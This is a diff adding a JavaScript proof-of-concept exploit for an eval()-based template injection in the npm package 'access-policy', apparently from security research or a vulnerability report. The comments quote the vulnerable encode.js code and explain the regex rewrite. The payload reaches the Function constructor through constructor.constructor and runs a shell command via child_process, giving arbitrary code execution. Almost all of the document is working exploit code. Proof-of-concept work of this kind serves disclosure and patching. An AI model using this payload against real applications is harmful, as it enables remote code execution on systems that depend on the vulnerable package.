@@ -1,0 +1,30 @@
+```javascript
+// Exploit for eval()-based template injection in access-policy's `tmpl` (template) function
+// node_modules/access-policy/lib/encode.js:
+//   function template(literal, data) {
+//     var tmpl = literal.replace(/(\$\{)/gm, '$1data.');
+//     return eval('`' + tmpl + '`');
+//   }
+// Attacker-controlled `statements` are JSON.stringify'd and fed into this eval'd
+// template literal. Any "${" in our payload becomes "${data." and is evaluated
+// as live JavaScript, giving full code execution.
+
+const access = require("access-policy");
+
+// "${...}" -> rewritten to "${data...." by the vulnerable regex, so we build
+// the payload to land on `data.constructor.constructor(...)()`, i.e.
+// Object -> Function, letting us run arbitrary code.
+const payload =
+  "${constructor.constructor('return process.getBuiltinModule(\"child_process\").execSync(\"id\").toString()')()}";
+
+const statements = [{ action: payload }];
+
+try {
+  const result = access.encode(statements, {});
+  console.log("Encoded output:", result);
+} catch (e) {
+  // Even if JSON.parse of the mutated string fails afterwards,
+  // the eval() has already executed our injected code (RCE achieved).
+  console.log("Post-RCE parse noise (exploit already ran):", e.message);
+}
+```
